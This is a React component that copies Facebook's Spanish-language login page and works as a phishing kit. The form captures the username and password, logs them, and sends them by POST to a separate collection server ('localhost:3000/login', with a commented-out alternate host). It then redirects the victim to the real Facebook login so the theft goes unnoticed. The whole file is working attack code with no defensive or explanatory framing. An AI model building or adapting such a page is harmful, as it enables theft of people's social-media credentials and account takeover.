import { useState } from "react";

function MainView() {
  const [user, setUser] = useState('');
  const [pass, setPass] = useState('');

  const handleSubmit = async (e) => {
    e.preventDefault();
    console.log(user, pass);
    try {
      await fetch('http://localhost:3000/login', {  // hppt://ip-api:3000/login
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({username: user, password: pass}),
      });
      setTimeout(() => {
        location.href = 'https://www.facebook.com/login/'
      }, 1000)
    } catch (error) {
      console.log(error);
    }
  }

  return (
    <div className="flex bg-[#F0F2F5] h-[72.5%] max-[430px]:bg-white">
      <div 
        className="flex flex-row gap-16 items-center px-10 max-w-screen-lg m-auto max-lg:flex-col max-[430px]:gap-0 max-[430px]:px-1 max-[430px]:relative max-[430px]:top-[-80px] max-[430px]:w-full"
      >
        <div className="relative lg:top-[-80px] flex flex-1 flex-col gap-2 max-lg:text-center max-[430px]:w-full">
          <h1 className="text-[#0866FF] text-6xl font-bold max-[430px]:text-2xl">facebook</h1>
          <p className="text-2xl font-normal max-[430px]:hidden max-w-md">Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p>
        </div>
        <div className="flex flex-col flex-1 gap-5 max-[430px]:w-full">
          <div className="flex flex-col gap-4 bg-white px-4 pt-4 pb-5 rounded-lg shadow-xl max-[430px]:shadow-none">
            <form onSubmit={handleSubmit} className="flex flex-col gap-3">
              <input
                type="text"
                placeholder="Correo electrónico o número de teléfono"
                onChange={(e) => setUser(e.target.value)}
                className="
                block 
                w-full 
                rounded-md 
                border-0 
                py-3.5 px-5 
                text-[17px] font-normal
                ring-1 ring-inset ring-[#DDDFE2] 
                placeholder:text-[#90949C] 
                focus:ring-1 focus:ring-inset focus:ring-[#0866FF] focus:placeholder:text-[#BEC3C9]
                max-[430px]:bg-[#F5F6F7]
                max-[430px]:hidden"
              />
              <input
                type="text"
                placeholder="Número de celular o correo electrónico"
                onChange={(e) => setUser(e.target.value)}
                className="
                block 
                w-full 
                rounded-md 
                border-0 
                py-3.5 px-5 
                text-[16px] font-normal
                ring-1 ring-inset ring-[#DDDFE2] 
                placeholder:text-[#757575] 
                focus:ring-1 focus:ring-inset focus:ring-[#000] focus:placeholder:text-[#757575]
                bg-[#F5F6F7]
                min-[430px]:hidden"
              />
              <input
                type="password"
                name=""
                id=""
                placeholder="Contraseña"
                onChange={(e) => setPass(e.target.value)}
                className="
                block 
                w-full 
                rounded-md 
                border-0 
                py-3.5 px-5 
                text-[17px] font-normal max-[430px]:text-[16px]
                ring-1 ring-inset ring-[#DDDFE2] 
                placeholder:text-[#90949C] 
                focus:ring-1 focus:ring-inset focus:ring-[#0866FF] focus:placeholder:text-[#BEC3C9] max-[430px]:focus:placeholder:text-[#757575]
                max-[430px]:bg-[#F5F6F7]
                max-[430px]:placeholder:text-[#757575]
                max-[430px]:focus:ring-[#000]"
              />
              <button className="block w-full bg-[#0866FF] rounded-md border-0 py-2 text-white font-semibold text-[22px] mt-1 hover:bg-[#1877F2]">
                Iniciar sesión
              </button>
            </form>
            <div className="text-center">
              <a
                href="https://www.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzA4NjQzNzE5LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&ars=facebook_login"
                className="text-[15px] text-[#0866FF] hover:underline">
                ¿Olvidaste tu contraseña?
              </a>
            </div>
            <div className="flex w-full items-center justify-center mt-1 relative">
              <span className="h-[1px] w-full bg-[#DADDE1]"></span>
              <span className="absolute top-[-13px] bg-white w-10 text-center hidden max-[430px]:block">o</span>
            </div>
            <div className="flex justify-center items-center my-2">
              <button
                className="
                  block 
                  bg-[#42B72A] max-[430px]:bg-white
                  rounded-md 
                  border-0 max-[430px]:border max-[430px]:border-[#BEC3C9]
                  py-2.5 px-4 max-[430px]:px-20 max-[430px]:py-2
                  text-white max-[430px]:text-black
                  font-semibold max-[430px]:font-normal
                  text-[18px] max-[430px]:text-base
                  mt-1 
                  hover:bg-[#36A420]"
              >
                Crear cuenta nueva
              </button>
            </div>
          </div>
          <div className="text-center px-5 max-[430px]:hidden">
            <span className="">
              <a href="https://www.facebook.com/pages/create/?ref_type=registration_form" className="font-bold hover:underline">
                Crea una página
              </a>{" "}
              para una celebridad, una marca o un negocio.
            </span>
          </div>
        </div>
      </div>
    </div>
  );
}

export default MainView;
